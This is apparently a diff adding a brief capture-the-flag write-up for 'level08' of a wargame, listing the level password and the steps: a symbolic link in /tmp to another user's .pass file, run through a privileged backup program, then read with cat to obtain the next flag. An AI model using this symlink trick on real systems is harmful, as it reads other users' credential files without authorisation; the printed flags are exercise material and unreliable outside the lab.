@@ -1,0 +1,14 @@
+level08 : 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+process :
+    - When we do command : ls -l
+    - We see the user of file level08 is level09.
+    - When we do ./level08 the program wait a file in argument
+    - We test to put the /home/users/level09/.pass to argument of program but the file can not open
+    - We will create a symbolic link to level09/.pass to pass this.
+    - cd /tmp
+    - mkdir -p mydir/backups to have the rights because the program read a file and write in backups.
+    - cd mydir
+    - ln -s /home/users/level09/.pass flag
+    - ~/level08 flag
+    - cat backups/flag
+    - get the flag : fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
